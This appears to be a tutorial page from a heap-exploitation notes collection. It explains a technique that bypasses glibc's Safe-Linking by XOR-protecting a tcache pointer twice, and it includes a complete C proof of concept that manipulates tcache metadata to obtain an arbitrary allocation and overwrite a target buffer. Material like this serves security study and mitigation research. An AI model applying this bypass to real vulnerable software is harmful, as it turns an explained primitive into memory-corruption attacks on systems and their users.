#metadata(
  (
    title: "Safe-Linking Double Protection Bypass",
    description: "A technique to bypass Safe-Linking by protecting a pointer twice, effectively canceling the obfuscation.",
    date: "2025-12-28",
    order: 5,
  ),
)<frontmatter>
#import "../../../../../typst-theme.c.typ": project
#show: project


= Safe-Linking Double Protection Bypass

== Introduction

This technique demonstrates a "blind bypass" for the *Safe-Linking* mitigation introduced in glibc 2.32. Safe-Linking obfuscates pointers in single-linked lists (like tcache and fastbins) by XORing them with the address where they are stored (shifted right by 12 bits).

The core of this bypass is the algebraic property of the XOR operation:
$(P xor K) xor K = P$

If we can trick the allocator into "protecting" a pointer that is already protected with the same key, the second XOR operation will effectively decrypt the pointer, returning it to its original, plaintext value.

== The Mechanism

When an entry is linked into the tcache, its address is XORed with the address it's being stored at (the "key"). By using a technique to control tcache metadata (such as *House of Water*), an attacker can point a tcache bin at an address that already contains a "safe-linked" pointer. When that address is subsequently treated as a chunk and "re-protected" or "stashed" into another bin, the protection is reverted.

== Example from `safe_link_double_protect.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int main(void) {
	char goal[] = "Replace me!";

	void *a = malloc(0x38);
	void *b = malloc(0x38);
	void *c = malloc(0x18);
	void *d = malloc(0x18);

	void *value = malloc(0x28);
	*(long *)value = ((long)(goal) & ~(0xf));

	free(a); free(b); 
	free(c); free(d); 

	void *metadata = (void *)((long)(value) & ~(0xfff));
	*(unsigned int*)(metadata+0xa0) = (long)(metadata)+((long)(value) & (0xfff));

	malloc(0x38);

	// VULNERABILITY: Double Protection
	*(unsigned int*)(metadata+0x90) = (long)(metadata)+0xa0;

	malloc(0x18);
	char *vuln = malloc(0x18);

	strcpy(vuln, "XXXXXXXXXXX HIJACKED!");
	assert(strcmp(goal, "Replace me!") != 0);
}
```

== Attack Flow Explained

1.  *Preparation*: Allocate chunks of different sizes (e.g., `0x20` and `0x40`) and fill a "value" chunk with the target pointer you wish to eventually allocate.
2.  *Initial Protection*: By manipulating tcache metadata, we link the "value" chunk into a tcache bin. Glibc treats the data we wrote (the target pointer) as a `next` pointer and "protects" it by XORing it with the chunk's address.
3.  *The Double Protect*: We use the metadata control primitive again to point a *different* tcache bin to the metadata of the first bin.
4.  *Reverting to Plaintext*: When the allocator processes the second bin, it performs the Safe-Linking XOR operation again. Because the "key" (derived from the address) is the same, $(P xor K) xor K$ results in $P$.
5.  *Arbitrary Allocation*: The next allocation from the second bin returns the original target pointer `P` in its plaintext form, bypassing the alignment and obfuscation checks.

== Security Implications

This bypass demonstrates that while Safe-Linking prevents simple "write-what-where" overflows, it does not protect against more advanced primitives that allow for metadata manipulation. If an attacker can control where the allocator looks for chunks, they can abuse the symmetry of XOR to undo the protection entirely.
